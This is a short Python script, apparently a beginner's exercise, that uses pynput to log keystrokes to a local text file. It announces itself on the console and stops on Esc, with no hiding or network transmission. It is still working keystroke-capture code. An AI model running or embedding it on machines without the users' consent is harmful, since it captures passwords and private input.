from pynput.keyboard import Listener, Key

# File where keystrokes will be logged
log_file = "Basic_key_log.txt"

# Function to handle key press events
def on_press(key):
    try:
        # Initialize the character to log
        letter = None
        # Handle printable keys
        if hasattr(key, 'char') and key.char is not None:
            letter = key.char
        # Handle special keys
        else:
            if key == Key.space:
                letter = "[Space]"
            elif key == Key.enter:
                letter = "[Enter]"
            elif key == Key.backspace:
                letter = "[Backspace]"
            elif key == Key.tab:
                letter = "[Tab]"
            elif key == Key.esc:
                letter = "[Esc]"
                print("Stopping... the keyboard listener.")
                return False  # Stop the listener
            else:
                return  # Skip other special keys (e.g., Shift, Ctrl)

        # Write the character to the log file
        with open(log_file, "a") as f:
            f.write(f"{letter}\n")

    except Exception as e:
        print(f"Error: {e}")

# Start listening for key presses
try:
    with Listener(on_press=on_press) as listener:
        print("Starting keyboard listener. Press Esc to stop.")
        listener.join()
except Exception as e:
    print(f"Failed to start listener: {e}")